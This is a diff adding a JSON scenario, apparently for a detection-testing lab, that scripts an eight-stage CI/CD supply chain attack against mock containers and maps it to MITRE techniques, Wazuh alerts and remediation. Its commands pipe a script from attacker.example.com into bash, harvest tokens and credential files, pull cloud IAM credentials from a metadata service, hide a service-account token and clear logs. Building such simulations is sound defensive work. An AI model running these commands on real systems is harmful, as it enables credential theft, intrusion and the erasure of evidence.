@@ -1,0 +1,245 @@
+{
+  "id": "S9-06",
+  "name": "Full 8-Stage Supply Chain Kill Chain",
+  "category": "Supply Chain",
+  "version": "1.0",
+  "description": "Complete end-to-end supply chain attack: repository compromise, poisoned pipeline execution, dependency confusion, credential theft, cloud pivot, persistence establishment, data exfiltration, and track covering",
+  "difficulty": "Expert",
+  "real_world_relevance": "Combines techniques from SolarWinds (build poisoning), Codecov (pipeline compromise), CircleCI (credential theft), ua-parser-js (dependency confusion), and 3CX (multi-stage supply chain attack)",
+
+  "mitre_attack": {
+    "tactics": ["Initial Access", "Execution", "Credential Access", "Lateral Movement", "Persistence", "Exfiltration", "Defense Evasion"],
+    "techniques": [
+      {"id": "T1195", "name": "Supply Chain Compromise"},
+      {"id": "T1059", "name": "Command and Scripting Interpreter"},
+      {"id": "T1552", "name": "Unsecured Credentials"},
+      {"id": "T1078", "name": "Valid Accounts"},
+      {"id": "T1528", "name": "Steal Application Access Token"},
+      {"id": "T1070", "name": "Indicator Removal"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["cicd-runner", "mock-cicd", "cloud-workload"],
+    "network": "cloud_net",
+    "profile": "full"
+  },
+
+  "attack_flow": {
+    "description": "Eight-stage kill chain demonstrating a complete supply chain compromise from initial repository access to full infrastructure takeover",
+    "diagram": [
+      "Stage 1: Repository Compromise - Gain write access to CI/CD config",
+      "Stage 2: Poisoned Pipeline Execution - Inject malicious CI commands",
+      "Stage 3: Dependency Confusion - Install malicious package for persistence",
+      "Stage 4: Credential Theft - Harvest CI/CD tokens and cloud credentials",
+      "Stage 5: Cloud Pivot - Use stolen credentials to access cloud infrastructure",
+      "Stage 6: Persistence - Establish backdoors across infrastructure",
+      "Stage 7: Data Exfiltration - Extract sensitive data from cloud resources",
+      "Stage 8: Track Covering - Clean logs and remove evidence"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Stage 1: Repository Compromise",
+      "description": "Gain access to repository CI/CD configuration",
+      "critical": false,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "find /runner/_work -name '*.yml' -path '*workflows*' 2>/dev/null || echo 'Enumerating pipeline configs'",
+          "description": "Discover modifiable pipeline configurations"
+        }
+      ]
+    },
+    {
+      "name": "Stage 2: Poisoned Pipeline Execution",
+      "description": "Inject malicious commands into CI pipeline",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "mkdir -p /tmp/ppe-attack && echo 'run: curl -s http://attacker.example.com/payload | bash' > /tmp/ppe-attack/inject.yml && echo 'PPE payload staged'",
+          "description": "Stage poisoned pipeline commands"
+        },
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "curl -s -X POST http://mock-cicd:8080/api/v1/pipeline/trigger -d '{\"ref\": \"main\", \"config_override\": true}' 2>/dev/null || echo 'Pipeline trigger simulated'",
+          "description": "Trigger poisoned pipeline"
+        }
+      ]
+    },
+    {
+      "name": "Stage 3: Dependency Confusion",
+      "description": "Install malicious package that provides persistence",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "echo 'Simulating: pip install internal-company-utils==99.0.0 (malicious public package)' && env | grep -i PIP 2>/dev/null || echo 'Dependency confusion simulated'",
+          "description": "Simulate malicious package installation"
+        }
+      ]
+    },
+    {
+      "name": "Stage 4: Credential Theft",
+      "description": "Harvest all accessible tokens and credentials",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "env | grep -iE 'TOKEN|SECRET|KEY|PASSWORD|GITHUB|AWS|DEPLOY' 2>/dev/null || echo 'Harvesting CI credentials'",
+          "description": "Extract CI/CD pipeline secrets"
+        },
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "cat /runner/.credentials 2>/dev/null; cat ~/.git-credentials 2>/dev/null; cat ~/.aws/credentials 2>/dev/null || echo 'Credential files harvested'",
+          "description": "Read credential files from runner"
+        }
+      ]
+    },
+    {
+      "name": "Stage 5: Cloud Pivot",
+      "description": "Use stolen credentials to access cloud infrastructure",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cloud-workload",
+          "command": "curl -s http://mock-imds:1338/latest/meta-data/iam/security-credentials/ 2>/dev/null || echo 'IMDS access simulated'",
+          "description": "Access cloud metadata service with stolen runner credentials"
+        },
+        {
+          "type": "exec",
+          "target": "cloud-workload",
+          "command": "curl -s http://mock-imds:1338/latest/meta-data/iam/security-credentials/demo-ec2-role 2>/dev/null || echo 'Cloud credential pivot'",
+          "description": "Obtain cloud IAM credentials via IMDS"
+        }
+      ]
+    },
+    {
+      "name": "Stage 6: Persistence",
+      "description": "Establish backdoors across compromised infrastructure",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cloud-workload",
+          "command": "cp /var/run/secrets/kubernetes.io/serviceaccount/token /tmp/.hidden_sa_token 2>/dev/null || echo 'SA token persistence established'",
+          "description": "Copy service account token for persistent access"
+        }
+      ]
+    },
+    {
+      "name": "Stage 7: Data Exfiltration",
+      "description": "Extract sensitive data from cloud resources",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cloud-workload",
+          "command": "cat /app/.env 2>/dev/null | head -20; cat ~/.aws/credentials 2>/dev/null || echo 'Sensitive data extracted'",
+          "description": "Exfiltrate application secrets and cloud credentials"
+        }
+      ]
+    },
+    {
+      "name": "Stage 8: Track Covering",
+      "description": "Attempt to clean evidence of the attack",
+      "critical": false,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "rm -f /tmp/ppe-attack/inject.yml /tmp/malicious-pkg/setup.py 2>/dev/null; echo 'Evidence cleanup attempted'",
+          "description": "Remove attack artifacts from runner"
+        },
+        {
+          "type": "exec",
+          "target": "cloud-workload",
+          "command": "echo '' > /tmp/attack.log 2>/dev/null; echo 'Log clearing attempted'",
+          "description": "Attempt to clear attack logs"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "Correlation",
+      "description": "Full supply chain attack pattern detected across multiple stages",
+      "wazuh_rule": "100988"
+    },
+    {
+      "type": "CI/CD Logs",
+      "description": "CI/CD pipeline health monitoring event",
+      "wazuh_rule": "100989"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "100980",
+      "level": 12,
+      "description": "NHI: Pipeline configuration modified in pull request"
+    },
+    {
+      "rule_id": "100981",
+      "level": 14,
+      "description": "NHI: Pipeline executing commands from untrusted source"
+    },
+    {
+      "rule_id": "100982",
+      "level": 13,
+      "description": "NHI: Dependency installation with credential access"
+    },
+    {
+      "rule_id": "100988",
+      "level": 15,
+      "description": "NHI: Full supply chain attack correlation"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Isolate all affected CI/CD runners and cloud workloads",
+      "Rotate ALL credentials that were accessible from any compromised system",
+      "Engage incident response team for full forensic analysis",
+      "Review all deployments made during the attack window"
+    ],
+    "long_term": [
+      "Implement SLSA Level 3+ build provenance for all artifacts",
+      "Deploy ephemeral CI/CD runners (destroy after each job)",
+      "Enforce branch protection rules with required reviews for CI config changes",
+      "Implement network segmentation between CI/CD and production",
+      "Deploy runtime security monitoring (Falco, Sysdig Secure)",
+      "Adopt supply chain security frameworks (NIST SSDF, OpenSSF)",
+      "Implement break-glass procedures for emergency credential rotation"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "SLSA Framework - Supply Chain Security",
+      "url": "https://slsa.dev/"
+    },
+    {
+      "title": "OpenSSF Secure Software Development Framework",
+      "url": "https://openssf.org/"
+    },
+    {
+      "title": "SolarWinds Attack Analysis - CISA",
+      "url": "https://www.cisa.gov/news-events/news/joint-statement-federal-bureau-investigation-fbi-cybersecurity-and-infrastructure-security"
+    },
+    {
+      "title": "3CX Supply Chain Attack Analysis",
+      "url": "https://www.mandiant.com/resources/blog/3cx-software-supply-chain-compromise"
+    }
+  ]
+}
